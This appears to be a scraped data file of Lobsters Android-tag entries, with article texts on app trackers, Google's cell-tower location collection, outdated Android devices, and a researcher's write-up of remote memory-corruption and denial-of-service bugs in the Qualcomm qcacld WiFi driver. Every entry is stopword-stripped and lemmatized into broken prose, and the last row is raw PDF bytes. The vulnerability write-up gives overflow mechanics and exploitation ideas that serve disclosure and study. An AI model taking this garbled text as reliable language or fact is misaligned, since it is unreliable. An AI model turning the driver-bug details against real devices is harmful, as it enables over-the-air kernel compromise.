work great mobile webapps firefox run fullscreen mode background file sync use dropbox mobile webapp quick file downloads dropbox account firefox send sending ephemeral file need better solution backing photo though using adbsync sync dropbox folder desktop also work microsoft although personal policy syncing work email phone make temporary exception loading outlookofficecom firefox work surprisingly well odd moment need send email check location meeting get job done guitarist also needed way tune guitar sadly excellent gstrings paid closed source nogo use paul lewis guitar tuning webapp instead good substitute singing bit offkey guitar tuner turn web capable quite bit hailing taxi tuning guitar conclusion hope demonstrated blog post possible use opensource phone without pervasive tracking spyware bloatware come expect smartphones actually quite viable even enjoyable booted galaxy first time immediately greeted barrage ad samsung tmobile service upsells minute took turn usb debugging could install custom software mercifully silence nagware clean strippeddown lineageos setup far horrendous outofthebox experience get note though setup work mileage may vary depending much rely various software service use gmail gdocs may better using googleflavored android phone bought itunes icloud ecosystem may trouble worth switch iphone also despite attempt demystify le obvious part setup way claiming accessible nongeek nonhacker crowd mere process installing lineageos far beyond capability average nontechie actually fill kind despair probably subject entire post becoming concerned friend opensource proprivacy hacker scene building twotiered world tech elite successfully install configure software maintains security privacy whereas average person stuck either paying premium privacyrespecting closedsource iphone paying reasonable price android phone security privacy far assured said maybe u inhabit admittedly neophyteunfriendly world maybe work make accessible u know use command line patience type imap server url smartphone let hope
212,Lobsters,android,Android,Researchers craft Android app that reveals menagerie of hidden spyware; legally barred from doing the same with iOS,https://boingboing.net/2017/11/25/la-la-la-cant-hear-you.html,researcher craft android app reveals menagerie hidden spyware legally barred io,yale privacy lab tracker profile staggering variety clandestine tracker found popular android apps analyzes privacy concern android application,yale privacy lab exodus privacy devastating report dozen invasive dangerous tracker hidden common android apps generated writing code spied target device internal operation uncovering manner sneaking trickery would great effective regulatory oversight power seek legal relief company lying u andor sneaking spyware life every bit important right independently audit action privacy lab exodus done install code override undesirable function spyware example blocking communication chaffing plausible garbage data exodus privacy app functionality key attaining first goal gathering independent evidence conduct mobile firm app provider without evidentiary basis way know need selfhelp measure way convince regulator take action possibility creating public clamour competing product would spur investor entrepreneur make tool let reclaim control device exodus yale note tracker almost certainly also present io company make advertise io compatibility one thing io drmlocked felony punishable prison sentence fine first offense usa dmca similar provision article eucd france exodus located distribute tool bypass drm even essential work discovering whether billion people risk due covert spying platform true u copyright office gave u soontoexpire exemption rule started exemption allows exodus use tool nt allow exodus make tool distribute independent researcher investigate io capability tracker uncovered exodus include targeting user based thirdparty data identifying offline movement machine learning tracking behavior across device uniquely identifying correlating user targeting user abandon shopping cart tracker work deriving identification code mobile device web browser sharing third party specifically profile app maker even tie data collected tracker profile individual including name account detail tracking company say anonymize data strict rule sharing publicly identifiable information sheer wealth data collected make possible identify user even face safeguard although apps identified exodus yale researcher may technically disclose use tracker fine print privacy policy term service app description difficult say least smartphone user get clear handle extent nature monitoring directed whole point using mobile app often save time many people actually know tracker even said michael kwet another visiting fellow yale privacy lab exodus create software even detect tracker offer user option opt via email privacy setting tracking resume even step taken example one app requires user clear cache set optout optouts temporary even optouts end permanent user would even know activate first place yale privacy lab tracker profile github staggering variety clandestine tracker found popular android apps yael grauerthe intercept analyzes privacy concern android application exodus ten year ago apple released ipad hotel room seattle jetlagged awake wife daughter slept last year eu adopted incredibly controversial copyright directive passed five vote afterwards meps said got confused pushed wrong button eu member state create rule require online platform filter usergenerated content block match secret unaccountable back world wide web consortium approved controversial standard long history encrypted medium extension eme enabled netflix big medium company use drm despite change browser extension eliminated kind deep hook drm requires project manager lot responsibility plate hipdeep major project ride herd project also need constantly gather data analyze result modify process report back various project stakeholder difficult position may federal law new car truck u must equipped rearview monitoring technology however still leaf million million vehicle produced two year ago without rearmounted sensor capable telling back bmw parking still nt climbed aboard robot vacuum cleaner bandwagon probably one question unleashing tiny carpet sucker home nag others actually good job le authority tech pcmag definitive statement saying robot vacuum
213,Lobsters,android,Android,Google collects Android users' locations even when location services are disabled,https://qz.com/1131515/google-collects-android-users-locations-even-when-location-services-are-disabled/,google collect android user location even location service disabled,privacy policy target advertising,many people realize smartphones track location actively turn location service used apps even inserted carrier sim card even take precaution phone running android software gather data location send back google connected internet quartz investigation revealedsince beginning android phone collecting address nearby cellular location service sending data back google result google unit alphabet behind android access data individual location movement go far beyond reasonable consumer expectation privacyquartz observed data collection occur contacted google confirmed practicethe cell tower address included information sent system google us manage push notification message android phone past month according google spokesperson never used stored spokesperson said company taking step end practice contacted quartz end november company said android phone longer send celltower location data google least part particular service consumer disable january year began looking using cell id code additional signal improve speed performance message delivery google spokesperson said email however never incorporated cell id network sync system data immediately discarded updated longer request cell id celltower location sent google android deviceit clear celltower address transmitted data string identifies specific cell tower could used improve message delivery privacy implication covert locationsharing practice plain information single cell tower offer approximation mobile device actually multiple tower used triangulate location within quartermile radius exact pinpoint urban area cell tower closer togetherthe practice troubling people prefer tracked especially lawenforcement official victim domestic abuse turn location service thinking fully concealing whereabouts although data sent google encrypted could potentially sent third party phone compromised spyware method hacking phone unique id number location data associatedthe revelation come google internet company fire lawmaker regulator including extent vacuum data user personal data ranging user political view purchase history location foundational business success company like facebook alphabet built targeted advertising personalization together valued trillion investorscelltower location collected sent google android phone location service turned carried washington dcthe locationsharing practice appear limited particular type android phone tablet google apparently collecting cell tower data modern android device contacted quartz source familiar matter said cell tower address sent google change early firebase cloud messaging service owned google run android phone defaulteven device reset factory default setting apps location service disabled observed quartz sending nearby celltower address google device cellular data wifi connection appear send data google time come within range new cell tower android device connected wifi network send tower address google even sim card installed pretty concerning implication said bill budington software engineer work electronic frontier foundation nonprofit organization advocate digital privacy kind envision number circumstance could extremely sensitive information put person risk section google privacy policy cover location sharing say company collect location information device use service indicate whether collect data android device location service disabled use google service may collect process information actual location use various technology determine location including ip address gps sensor may example provide google information nearby device wifi access point cell towersaccording google spokesperson company system control push notification message distinctly separate location service provide device location apps android device never offered consumer way opt collection cell tower data really mystery optional said matthew hickey security expert researcher hacker house security firm based london seems quite intrusive google collecting information relevant carrier network sim card enabled service google say use location data collect using service allow advertiser target consumer using location data approach obvious commercial value company tell using precise location tracking example whether individual android phone running google apps set foot specific store use target advertising user subsequently see
214,Lobsters,android,Android,More than 1 billion Android devices run outdated software,http://www.osnews.com/story/30085/More_than_1_billion_Android_devices_run_outdated_software,billion android device run outdated software,horrifying explains excellent android review suspicion sure would suffer shady nonsense,horrifying even data take guess many outdated device use may google announced two billion active android device look latest stats far right edge see nearly half device two year date point expect one billion device two year date given android update model expect approximately device ever get updated modern version android whenever bring humongous issue dangerously irresponsible let average consumer use platform apologist come woodwork two argument apple shill antigoogle google play service project treble google play service indeed ensures number part entire android operating system stack updated google play good move fact android ahead io respect thing like safari browser engine updated operating system update instead app store operating system update present far bigger barrier updating mere app update however vast part android updated play store pose serious security threat user platform google play service anything silver bullet android appalling update situation project treble second term people throw around whenever talk android lack update think people really understand project treble problem solve ron amadeo explains excellent android review project treble introduces vendor interface standardized interface sits o hardware long soc vendor plug vendor interface o plug vendor interface upgrade new version android work oems carrier still need involved customizing o rolling user party involved update parallelize work needed get update running soc code longer first step everyone else need wait treble address important technical aspect android update process ensuring oems spend le time tailoring android update every specific soc every specific smartphone however mean oems push button next google android code drop ready go phone still port modification part android test everything approved carrier push device worldwide project treble address part technical aspect android update nearly treble huge improvement clearly repays huge technical debt android platform actually address real reason oems lax updating phone political reason even entirely unrealistic unlikely honestly impossible event treble solves technical barrier updating android phone oems still know actually choose even expensive branddefining android flagship note galaxy lg v updated best six month release new version android even rollout usually take month country region carrier phone getting update much much later really hard update android phone oems care samsung care lg care htc care much rather spend time resource selling next flagship updating one already paid treble nothing address let assume treble address technical barrier also political barrier entirely unlikely impossible know sake argument let assume even best four five year experience benefit treble treble requirement new device shipping android box entirely optional existing device updated current pace android update mean earlier four five year truly start enjoying fruit treble team labour point twelve thirteen year accumulating unupdateable insecure android device cold harsh truth platform android mess quickly cobbled together rushed response original iphone ever since google trying repay technical debt resulting rushed response sucking time resource away advancing state art mobile operating system aside suspicion google already set internal timeline move away android know today move towards new operating system altogether suspicion treble much android update containerising android runtime make easy possible run android application asis new platform avoids learns mistake made android every one know android user prefer android competition allows use phone way want better competition recently would choose android apple hardware io android hardware use macosvswindows meme day week day sure would option android user today pixel phone probably buy anyway available three country even buy fall apart seam buy samsung htc whatever perpetually run outdated insecure software buy something smaller oem suffer shady nonsense deeply enveloped android bubble see dire situation platform
215,Lobsters,android,Android,How out of date are android devices?,https://danluu.com/android-updates/,date android device,date android device found large effect let know percentile date io window xp still see nearly year old device use conclusion google claim problem fixed latest android version oreo android update alliance annoucement mostly nt happen fuchsia response latency tested,date android device common knowledge android device tend date io device actually mean let look android marketshare data see old device wild x axis plot date axis android marketshare share device sum artifact public data google provides low precision color indicates age blue current api major version yellow month orange year dark red year bright redwhite year light grey year grey year black year look graph see number revers shaped contour pair contour device get older go left right contour corresponds release new android version associated device running android version time pass device version get older device upgraded effectively removed one contour new contour color change le outdated color three major way graph understates number outdated device first using api version data access marketshare point release minor update assume device api version date moment new api version released many perhaps device receive update within api version second graph show marketshare number android device dramatically increased time example look ile outdated device ie draw line bottom ile device today month outdated huge growth android mean many many outdated device third data come scraping google play store marketshare info data show marketshare device visited play store last day general seems reasonable believe device visit play store date device expect unknown amount bias data cause graph show device newer actually seems plausible device used conventional mobile device well mobile device replaced thing liked traditonally embedded device po box etc looking security standpoint device receive update without updating major version skewing date look outdated used however researcher used finegrained data see device taking update found large effect one thing see graph time go world accumulates larger fraction old device time make sense could figured without looking data back beginning android phone much year old possible android device nearly decade old something obvious without looking data uptake new version seems slowing see looking last contour line top right graph corresponding recent android release line shallower slope contour line previous release unfortunately data alone tell slope shallower possible reason might android growth slowing android device turnover device upgrade rate slowing fewer device receiving update without data impossible tell much contributing problem btw let know know reasonable source active number android device going back love produce companion graph total number outdated device even data take guess many outdated device use may google announced two billion active android device look latest stats far right edge see nearly half device two year date point expect one billion device two year date given android update model expect approximately device ever get updated modern version android percentile since lot going graph might able see something look subpart graph look single horizontal line across graph corresponds device age certain percentile graph date x axis age month axis line corresponds different percentile higher percentile older corresponds horizontal slice top graph percentile individual line seems two large phase stuff one phase device percentile get older quickly time passing followed phase average device get slightly older second phase device sometimes get younger new release push younger version certain percentile happen often enough counteract general aging device taken whole graph indicates current trend continue expect see proportionally old android device time go exactly expect first busier graph date another way look graph look vertical slice instead horizontal slice case slice corresponds looking age device one particular date plot x axis indicates age percentile axis indicates raw age month line one particular date older date lighter yellower newer date darker greener view data see android device appear getting date time go graph would busy read plotted data date available see animation io reference io released two month ago io marketshare despite november number coming release iphone x compared marketshare latest android version released august overwhelmingly likely start next year io marketshare outside chance marketshare ie likely corresponding plot io would ile red line second plot age implausible ile orange line would sometimes dip case android older device stubbornly refuse update io released bit two year ago sits bit marketshare mean io version plot plausible see corresponding ile green line second plot bit two year half see android plot window xp people sometimes compare android window xp large number wild case device get security update however tremendously unfair window xp released got security update twelve half year later additionally microsoft released least one security update official support period update response wannacry ransomware unfortunate microsoft decided end support xp still many xp box wild supporting old o twelve year issuing emergency security patch fifteen year put microsoft completely different league google apple come device support another difference android window android scale unprecedented desktop world roughly million pc sold samsung alone selling many mobile device per year since course nt android device android dominance nonios mobile space mean overall mostly android device today still see nearly year old device use enough pdps around running one cute quaint surprise million sold desktop box age service quickly pdps mobile device age service even quickly sheer difference number device caused ubiquity modern computing device mean going see many xpera pc use year release xp plausible see even mobile device around year many ancient pdp vax do etc box basically safe run nonnetworked configuration look like thing going true many old xp android box going stay service decade conclusion seen android device appear getting date time make difficult developer target new android api feature new mean anything introduced past year also mean lot android device behind term security true absolute term also relative io recently android directly tied hardware ran making painful keep old device date requiring custom android build phonespecific least socspecific work google claim problem fixed latest android version oreo people remember google android update alliance annoucement may bit skeptical recent annoucement google u carry announced keep device date month mostly nt happen however even current annoucement nt smoke mirror latest version android solves update probem seen take year android release get adopted also seen last android release significantly slower uptake previous release additionally even though supposed make update easier look like android still likely stay behind io term update google promised latest phone pixel get update three year seems like step right direction seen graph extending support year nearly enough keep android device date iphone latest version io released work device back iphone released look newest android release look like quite lucky two year old device get latest update oldest google phone supported nexus giving two year support look back device released around situation look even worse back got free moto x working google moto x close official google phone could get time back google owned moto moto x released month iphone latest version android support released little year half later android phone era moto x supported unusually long time good sign thing look worse look back time rate thing improving year decently supported android device released year beyond year android version widespread use possible fuchsia fix fuchsia also many year away widespread use future post look android response latency also quite interesting much variable phone io response latency different model iphone main thing missing analysis phone latency older phone old phone tested want donate testing mail dan luu recurse center broadway floor new york ny thanks leah hanson kate murphy daniel thomas marek majkowski zofrex aissn chris palmer jonluca de caro anonymous person commentscorrectionsrelated discussion also thanks victorien villard making data graph based available
217,Lobsters,android,Android,Please Stop Naming Vulnerabilities: Exploring 6 Previously Unknown Remote Kernel Bugs Affecting Android Phones,https://pleasestopnamingvulnerabilities.com/,please stop naming vulnerability exploring previously unknown remote kernel bug affecting android phone,prelude introduction fifty derrek technical introduction blogged owned basic bug best bug standardized start exploit using bug joshua j drake scapy fakeap bug remote kernel do infinite loop john regehr blog bug remote do part deux bug heap buffer overflow bug another heap overflow fixed bug another heap overflow bug cve remote kernel stack disclosure bug cve remote heap overflow,prelude world everyone know security vulnerability really security vulnerability unless given name cve hype krew hired promote blog post written blakhat talk delivered continue tradition naming hyping bug present stop naming remote proximal kernel memory corruption bug present router android phone including pixel xl nexus introduction past two year spent time auditing various android kernel looking vulnerability two year found reported around fifty bug late early became burnedout hunting bug became race talented researcher example derrek spent month auditing coding pocs bug wifi driver nearly report duplicate chinese team becoming hard compete team hour week hobby coffee saturday morning burnout subsided wanted find super cool bug reignite interest hunting course find reason use domain result decided start looking remote memory corruption bug remote bug talk november released bulletin wrote bug planned dislocse guess batch worth fix public repos mean go find link android disclosure would like thank steve robert proofreading making coherent technical introduction bug found qcacld qualcommatheros wifi driver shipped least two phone aware unlike broadcom wifi soc gal beniamini blogged nitay owned qualcomm soc partial softmac meaning medium access control mac sublayer management entity mlme handled host software hardware soc firmware source code handling sort management frame must driver thus available look knowing look turned difficult hoped anyone found bug qcacld driver written code attest confusing interface show control driver truly see many line code took implement scotty hacktheplanet find name xargs wc l wcnssinchalcompilerh wcnssincwlannvh total see nearly line code single wifi driver plan look interrupt wifi chipset firmware host driver notifying available packet frame planned follow call chain found bug unfortunately could pinpoint true entry host drive eventually gave last ditch effort started greping feature knew wifi driver might implement time hunting feburary march bug gal written blog post good tip provided knew deauthentication frame started grepping luckily greeted following quickly zoned decided see else directory see plethora file dedicated management frame seemed found right location last thing needed auditing confirm code actually used put prerr hello world n func main function handler management frame confirmed code use basic bug explain bug requird understand surrounding code point call chain notification firmware packet enter function function verify packet management frame parse subtype call correct management handler switch fctype case sirmacmgmtframe received management frame switch fcsubtype case sirmacmgmtassocreq make sure role support association limisbtampaprole psessionentry limisaprole psessionentry limprocessassocreqframe pmac prxpacketinfo limassoc psessionentry else unwanted message log error limlog pmac loge fl unexpected message received x limmsg type break case sirmacmgmtassocrsp limprocessassocrspframe pmac prxpacketinfo limassoc psessionentry break case sirmacmgmtreassocreq make sure role support reassociation limisbtampaprole psessionentry limisaprole psessionentry limprocessassocreqframe pmac prxpacketinfo limreassoc psessionentry else unwanted message log error limlog pmac loge fl unexpected message received x limmsg type break case sirmacmgmtreassocrsp limprocessassocrspframe pmac prxpacketinfo limreassoc psessionentry break case sirmacmgmtprobereq limprocessprobereqframemultiplebss pmac prxpacketinfo psessionentry break case sirmacmgmtprobersp psessionentry null limprocessproberspframenosession pmac prxpacketinfo else limprocessproberspframe pmac prxpacketinfo psessionentry break correct handler called need parse packet raw overthewire overtheair form cstyle structure use conversion happens behemoth file file compiler generated handle conversion example overthewire raw byte cstyle struct seen interestingly parse overthewire byte cstyle structure also parse even cstyle structure another cstyle structure cstyle structure every field management frame example management frame contain list capability struct structure capability driver may want use capability instead passing around large structure ever single field need pull item large structure smaller structure way allocating memory thing driver actually use refinement handled following function refinement driver us data however need really happens super relevant bug small graphic illustrating data flow packet best bug general understanding high level general data flow jump first best bug first bug present file alluded tasked parsing overthewire packet cstyle structure file get overthewire packet packet structured series information element ie ie typelengthvalue tlv ie consists one byte tag one byte length byte value image stolen blog post project tag standardized represent specific type element code littered ie definition represent could possibly contained packet instance say phone try connect home network point protocol chain access point send back u association response phone get association response packet driver eventually call immediately call unpackcore decompose call unpackcore bit pctx state structure pbuf overthewire list tlvs nbuf total size pbuf ffsassocresponse list mandatory y must pbuf iesassocresponse list optional y pbuf pfrm structure meaning parsed y translated member struct dump ton struct definition important understand bugssorry try follow along take look definition iesassocresponse structure remember list optional ie member packet contain take look definition structure member structure corresponding tiedefn structure iesassocresponse array translate tiedefn structure english respect structure typedef struct siedefn offset offset structure place parsed data instance structure contain extsupprates would offset offsetof extsupprates presenceoffset member structure present flag get set parser saw ie raw packet buffer parsed data member countoffset ie sent raw tlv packet offset represents structure count many y type parsed life example assoc response go look ricdatadesc right see numricdatadesc countoffset offsetof numricdatadesc const char name self explanatory name ie parsing arraybound parser accepts multiple y single packet type like showed ricdatadesc value represents many y accept assoc response frame array bound var ricdatadesc wmmtspec go back picture assoc resp frame see one num representing many thesis ie parsed count offset ricdatadesc arraybound would wmmtspec arraybound everything else would minsize minimum size ie maxsize maximum size ie sig unique number representing ie used internally parser see later used case huge switch statement get u right parser function unsigned char oui unsigned char noui along eid ie oui mostly used tag vendor tag want support multiple tag number different type pas along oui byte represent specific type noui many oui byte look eid eid tlv tag dunno nt call tag tframesbool fmandatory tiedefn iesassocresponse list reminder optional y raw packet look like blow example member tiedefn described quick example take member map definition make sure understand setup removed majority definition large static const tiedefn iesassocresponse offsetof supprates offsetof present supprates sigiesupprates offsetof extsupprates offsetof present extsupprates sigieextsupprates offsetof ricdatadesc offsetof present offsetof numricdatadesc ricdatadesc sigiericdatadesc offsetof wmmtspec offsetof present offsetof numwmmtspec wmmtspec sigiewmmtspec understand structure definition parser us take look relevant parser code unpackcore nbufremaining nbufremaining pctx frloge frfl frame report one byte remaining fixed fieldsn status framesdbgbreak goto mandatorycheck pie findiedefn pctx pbufremaining nbufremaining y definition findiedefn translated comment high level findiedefn loop entire optional ie list case iesassocresponse seeing buffer current index contains tag ie function start index iesassocresponse array say buffer contain eid try index contain eid go index contain eid yes okay return tiedefn structure representing eid static const tiedefn findiedefn tpanisirglobal pctx pbuf nbuf const tiedefn y const tiedefn pie void pctx pie y start index list optional ie iesassocresponse pie eid nt reached end iesassocresponse list pbuf pie eid raw packet current index current tag extra noui byte check return pie noui return pie tag match extra oui data compare let compare nbuf pie noui pctx pbuf pie oui pie noui return pie raw packet nt match ie definition let try next one pie ie nt recognized type frame return null return null continuation unpack core immediately following call findiedefn pie findiedefn pctx pbufremaining nbufremaining y point let assume proper pie let say saw ie extract tag packet eid pbufremaining nbufremaining extract length packet len pbufremaining nbufremaining find ie definition raw packet validation check pie pie noui pie noui nbufremaining pctx frlogw frfl ie report length oui bytesn eid len pie noui framesdump pctx pbuf nbuf pctx frfl parsed te buffer show leftn pbufremaining pbuf nbufremaining status framesdbgbreak goto mandatorycheck pbufremaining pie noui nbufremaining pie noui len pie noui tlv report length greater amount data left buffer bail prevent oob read len nbufremaining pctx frlogw frfl ie report length byte remaining framen eid len nbufremaining framesdump pctx pbuf nbuf pctx frfl parsed te buffer show leftn pbufremaining pbuf nbufremaining status framesdbgbreak goto mandatorycheck call findiedefn find ie recognize packet let start parsing pie size validation nbufremaining pie minsize pie noui pctx frlogw frfl ie must least byte size byte remaining framen pie name pie minsize nbufremaining framesdump pctx pbuf nbuf status framesdbgbreak goto mandatorycheck else weird check nt really anything except complain dmesg len pie maxsize pie noui pctx frlogw frfl ie report unexpectedly large size presumably uptodate parser wa rning may also indicate corrupt framen pie name framesdump pctx pbuf nbuf ie element array bound like explained frame type accept multiple ie type packet grab current count many already parsed store countoffset first iteration second time see ie etc etc ie element array bound countoffset become countoffset pie arraybound pfrm pie countoffset switch pie sig switch signature take u correct parsing function listed case two array bound signature association response case sigiericdatadesc reset pointer back since container ie nt eid len pbufremaining nbufremaining pie pie noui pbufremaining pie noui nbufremaining pie noui len pie noui status getcontainerieslen pctx pbufremaining nbufremaining len iesricdatadesc status status break status pctx pbufremaining len pfrm pie offset sizeof countoffset break case sigiewmmtspec ie call case sigiewmmtspec status pctx pbufremaining len pfrm pie offset sizeof countoffset let break call bit pctx pbufremaining len pfrm pie offset sizeof countoffset interesting portion call last parameter pfrm start memory structure pie offset like described amount byte member life second half math sizeof countoffset calculate index array remember wmmtspec look like structure wmmtspec slot array save like said first time save slot count offset break default pctx frloge frfl internal error nt know ie signature likely framesc bugn pie sig framesdbgbreak return array bound add one num case wmmtspec math take u location memory numwmmtspec inside life add one pie arraybound pfrm pie countoffset point remaining ie input buffer jump back top loop try find another ie defn parse rest packet given enough information able spot bug like like try see bug blog post spoil go back keep reading code need hint happens send another wmmtspec ie association response get parsed index get stored iteration time send wmmtspec ie problem parsing code never validate countoffsetnum arraybound remember said countoffsetnum represents many element currently parsed arraybound represents many available slot adversary send say wmmtspec parsing code happily continue parsing storing slot remember slot wmmtspecs typedef struct capability status aid supprates extsupprates edcaparamset rcpiie rsniie rrmenabledcap mobilitydomain ftinfo numricdatadesc ricdatadesc wpa timeoutinterval htcaps htinfo wmmparams wmmcaps eseradmgmtcap esetrafstrmmet esetxmitpower numwmmtspec wmmtspec wscassocres vhtcaps vhtoperation extcap obssscanparameters qosmapset send wmmtspec overflow wscassocres vhtcaps etc blow outside structure reason bug good target different type memory since bug generic parsing code y structure allocated different location allocated stack bs wide variety location overflow need find management packet arraybound ie see struct allocated even go bs heap show bit bug would excellent target true proximal kernel remote code execution controlled data variety location overflow one moment bug stumbled across code unpackcore case sigieneighborreport countoffset maxsupportedneighborrpt status pctx pbufremaining len pfrm pie offset sizeo f countoffset else status break surprised see one ie type done patch fix memory corruption wanted see circumstance fixed git blame found offending commit october qca opportunity kill entire bug instead one thought say ie vuln maybe bug lived good time point developer need think security patcheswriting code especially embedded systemsdrivercc code developer training security bug could prevented start exploit using bug want thank joshua j drake helping rewriting pocs rely scapy fakeap also thanks helping working towards exploit google android reward program give option submit working exploit get remote kernel compromise close taking week vacation job spending full time using bug get remote code execution emailed android security guy get clarification turn bug qualify first proximal remote second submitted bug prior june eligible around still lot money worth burning week vacation time last thought want essentially remote kernel compromise sm webpage something btwifi stack unsolicited opinion remote kernel compromise userland vector requiring long chain exploit google pixel phone far low even zerodium pay little ever sell guy may easy use shitold version android towel root still work using uptodate google phone getting kernel execution longer easy task seeing super bad bug remote wifi via fwremote wifi via driver google apple successfully locked kernel intrusion via local route selinux policy strict coupled forcing least privledge make local kernel compromise difficult pixel phone okay back technical detail said bug good region memory overflow target bs heap stack unfortunately stack anymore could smash stack control ip thanks commit unfortunately pointer anything useful struct stack cookie location bs overflow useful target bs allocation gigantic voscontext structure overflow another thing overflow bs segment deep enough hit voscontext cause side effect smash anything important later location copy overflowed structure bs heap tsirretstatus tpanisirglobal pmac pframe nframe tpsirassocrsp passocrsp passocrsp allocated heap function call u static ar status cnt zeroinit parameter vosmemset passocrsp sizeof tsirassocrsp delegate framescgenerated code status pmac pframe nframe ar ifdef arnumricdatadesc cnt arnumricdatadesc cnt arricdatadesc cnt present vosmemcopy passocrsp ricdata cnt arricdatadesc cnt sizeof passocrsp numricdata arnumricdatadesc passocrsp ricpresent true endif parsing code overflowed arricdatadesc control many overflowed thus control arnumricdatadesc well control many ricdatadescs shove passocrsp ricdata cnt passocrsp heap allocation using one simple trick pivot bs overflow heap overflow mostly controlled data unfortunately point lost interest stopped bug remote kernel do infinite loop bug probably exciting people looking make exploit love memory corruption one super cute integer overflow bug attending university utah b m worked time took class john regehr blog guy one expert undefined behavior c taught literally everything know integer c one favorite blog post defunct quiz integer luckily located digging google see quiz quiz highlight type stuff need know auditing c code lot time run really strange scenario end causing exploitable bug later code put phone access point mode tethering management packet opened driver parse thing like association request authentication request etc phone ap mode send association request send along something called rsn opaque know crap send along care send parsing code unpackcore place nicely u passocreq variable set passocreq rsnpresent one continue eventually get limlimprocessassocreqframec package along rsn data call pas lengthdata function unpack function tasked converting raw byte cstyle struct saving result stackbased variable take look exactly see extract pwiseciphersuitecount raw buffer via framesntohs call immediately verify pwiseciphersuitecount le four larger unset present flag return sorta suck parse correctly return error bad take step back look call see call following way passocreq rsnlength unpack rsn ie pmac passocreq rsninfo passocreq rsnlength see anything broken calling function ever check return value continuing code call limcheckrxrsniematch take look first loop see reason infinitely loop hint type pwiseciphersuitecount extract pwiseciphersuitecount type spoiler since fully control pwiseciphersuitecount extracted framesntohs framesnetworktohostshort count variable loop type cause infinite loop send pwiseciphersuitecount fail never unset pwisecipher return bad ie never check return value continue limcheckrxrsniematch enter loop pwiseciphersuitecount max keep looping obviously never get due width constraint loop keep spinning watchdog kick nuke kernel awhile said send wpa opaque data true bug unchecked return value leading mismatch infinite loop bug remote do part deux one bug chopping block blog post original fix actually incorrect rereported bug new fix work bug heap buffer overflow circa seems portion management frame include qos type information send alone append onto association reponse specifically append qos mapset element along association response cause corruption see see example set numdscpexceptions verify length le verify start walking call chain end end function following arqosmapsetpresent passocrsp qosmapsetpresent convertqosmapsetframe pmac passocrsp qosmapset arqosmapset limlog pmac fl received assoc response qos map set limlogqosmapset pmac passocrsp qosmapset start converting one struct another struct calling convertqosmapsetframe pmac passocrsp qosmapset arqosmapset looking function really make sense go back heap buffer header look function see put anywhere byte worth data dscpexceptions array ever amount data memcpy array set size pdst numdscpexceptions look convertqosmapsetframe function numdscpexceptions numdscpexceptions qos numdscpexceptions numdscpexceptions qos numdscpexceptions see example set max minimum check send numdscpexceptions well promotes integer math get intmin divide int intmin get intmin stuff full bit intmin get take bottom byte int sending numdscpexceptions trick code storing qos numdscpexceptions looping typedef struct ssirqosmapset present numdscpexceptions dscpexceptions dscprange tsirqosmapset tpsirqosmapset see slot available dscpexceptions blow end structure adjacent heap object bug another heap overflow qcacld driver support roaming action frame think part spec action frame designed assist neighbor ap discovery without scan themself actually cool idea designed power constraint device continuously scan network roam instead ask current associated ap list known neighbor ap scan return info station interesting thing driver even ask data access point send roam action frame qcacld happily parse send roam action frame see happens first get way limprocessactionframe function since sending radio measure request enter limprocessradiomeasurerequest like every bug ever packet hop function parse cstyle structure pas following optional y array unpackcore remember y array describes type element parser expects potentially packet bug focusing apchannel report functionality one send packet offsetof measurementrequestbeaconapchannelreport offsetof present offsetof measurementrequestbeaconnumapchannelreport apchannelreport sigieapchannelreport see definition numapchannelreport could use first bug structure pretend fixed looking definition send ap channel report number string arraybound check parse ap channel report see bound amount channel okay pdst structure slot allowed send ap channel report scenario send report unwind call stack land back limprocessradiomeasurerequest call rrmprocessradiomeasurementrequest pmac phdr sa frm psessionentry contains parsed frame pdst referred parsing core inside rrmprocessradiomeasurementrequest see following code skipped irrelevant stuff see call rrmprocessbeaconreportreq one parameter pas prrmreq measurementrequest structure passing contains ap report stepping function skipping code code loop ap channel report store channel list pchanlist list move pointer forward deeper destination array remember sent channel per ap channel report first copy move pointer byte take look pchanlist psmebcnreportreq channellistchannelnumber channelnumber array look like pretty straight forward see typedef siresemaxmeasiereqs storing byte per ap report array provisioned nonsense bug another heap overflow send specially crafted authentication frame phone ap mode eventually land immediately call authentication packet attach specific tlvs static const tiedefn iesauthentication offsetof challengetext offsetof present challengetext sigiechallengetext offsetof rsnopaque offsetof present rsnopaque sigiersnopaque offsetof mobilitydomain offsetof present mobilitydomain sigiemobilitydomain offsetof ftinfo offsetof present ftinfo sigieftinfo offsetof timeoutinterval offsetof present timeoutinterval sigietimeoutinterval offsetof ricdatadesc offsetof present offsetof numricdatadesc ricdatadesc sigiericdatadesc null one interest u bug challenge text challenge text useful wep encryption scheme regardless ap wep enabled append authentication frame driver parse unpackcore call specific parsing function challenge text arrive tpanisirglobal pctx pbuf ielen pdst status void pbuf void ielen shutup compiler pdst present status pdst present pdst numtext ielen ielen pdst present return pctx pdst text pbuf ielen void pctx return status end see bound amount challenge text byte function completes unpackcore finish end back following transliterate tsirmacauthframebody pauth authalgonumber authauthalgoalgo pauth authtransactionseqnumber authauthseqnono pauth authstatuscode authstatusstatus authchallengetextpresent pauth type sirmacchallengetexteid pauth length authchallengetextnumtext vosmemcopy pauth challengetext authchallengetexttext authchallengetextnumtext look pretty sane need see pauth structure look like come parameter auth convert function tpanisirglobal pmac pframe nframe tpsirmacauthframebody pauth type tpsirmacauthframebody find typedef aniattrprepacked struct ssirmacauthframebody authalgonumber authtransactionseqnumber authstatuscode type sirmacchallengetexteid length sirmacauthchallengelength challengetext sirmacauthchallengelength aniattrpacked tsirmacauthframebody tpsirmacauthframebody finally need see large sirmacauthchallengelength really define sirmacauthchallengelength challenge text enough space remember raw packet parsing made max length byte memcpy vosmemcopy pauth challengetext authchallengetexttext authchallengetextnumtext copy byte structure allocated bug cve remote kernel stack disclosure bug quite strange seems case todo never got thus lead pretty bad bug luckily affect nexus pixel phone ap mode auth used however probably affect phone router ap set wep encryption something never authentication phase protocol access point send authenticating station station use encryption key encrypt challenge text send back access point access point encrypt challenge text well compare response station assuming match station allowed network station must start got way look code driver recieves authentication frame eventually enter limprocessauthframe limprocessauthframec prototype local function look like following thing really want point image challenge text array byte char array bugfree world fill data station encrypt assuming ap mode wep key enabled continue function eventually get supposed get random byte instead since c preinitalize anything stack ever valuable stack content funciton call leaked frame bug cve remote heap overflow coming sometime future know
218,Lobsters,android,Android,Forensic Analysis of Telegram Messenger on Android Smartphones,http://people.unipmn.it/sguazt/pubs/Anglano-2017-Telegram.pdf,forensic analysis telegram messenger android smartphones,,obj length filter flatedecode stream r f endstream endobj obj length filter flatedecode stream
